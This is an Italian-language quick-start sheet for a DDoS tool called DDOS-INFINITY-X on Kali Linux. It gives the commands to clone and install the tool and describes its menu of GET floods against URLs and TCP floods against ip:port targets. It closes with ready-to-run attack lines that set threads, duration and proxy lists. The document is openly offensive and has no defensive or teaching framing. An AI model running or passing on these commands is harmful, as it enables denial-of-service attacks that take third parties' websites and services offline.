# Kali Linux — comandi installazione

## Copia tutto nel terminale

```bash
cd ~
rm -rf DDOS-INFINITY-X
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 start.py HELP
```

## Nuovo terminale

```bash
cd ~/DDOS-INFINITY-X
source venv/bin/activate
python3 start.py HELP
```

## Menu 1 2 3 4

```bash
python3 start.py MENU
```

- **1** → attacco GET (solo URL)
- **2** → attacco TCP (solo ip:port)
- **3** → tools
- **4** → lista metodi

Veloce senza menu:

```bash
python3 start.py 1 http://site.com
python3 start.py 2 1.1.1.1:80
```

## Uso classico

```bash
python3 start.py GET http://site.com 0 1000 http.txt 10 100
python3 start.py TCP 1.1.1.1:80 500 60
python3 start.py tools
```

Vedi [COMMANDS.md](../COMMANDS.md)
